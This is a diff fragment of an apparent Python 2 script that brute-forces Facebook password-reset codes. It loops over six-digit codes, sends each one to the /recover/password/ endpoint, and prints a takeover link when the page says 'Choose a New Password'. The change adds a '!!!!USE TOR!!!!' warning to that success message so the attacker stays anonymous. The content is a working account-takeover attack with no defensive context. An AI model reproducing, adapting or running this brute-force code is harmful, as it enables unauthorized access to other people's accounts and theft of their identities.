@@ -29,10 +29,10 @@ for index[0] in range(10):
                                 for index[4] in range(10):
                                         for index[5] in numba.prange(10):
                                                 #Let it rain !#############################
-                                                for x in range(6):                 #
+                                                for x in range(6):                        #
                                                         code[x] = cs[(index[x]+rain)%10]  #
                                                         rain += x+1                       #
-                                                for x in range(1, 7):              #
+                                                for x in range(1, 7):                     #
                                                         rain -= x                         #
                                                 rain -= 4                                 #
                                                 ###########################################
@@ -42,6 +42,6 @@ for index[0] in range(10):
                                                 connection.request('GET', "/recover/password/?%s" % query, headers=headers)
                                                 answer = connection.getresponse()
                                                 if answer.read().find("Choose a New Password") >= 0:
-                                                        print "go to the page https://www.facebook.com/recover/password/?u=%s&n=%s&s=23&exp_locale=en_US&redirect_from=button" % (user, code)
+                                                        print "!!!!USE TOR!!!!\nlink is https://www.facebook.com/recover/password/?u=%s&n=%s&s=23&exp_locale=en_US&redirect_from=button" % (user, code)
                                                         exit(0)
                                                 count += 1
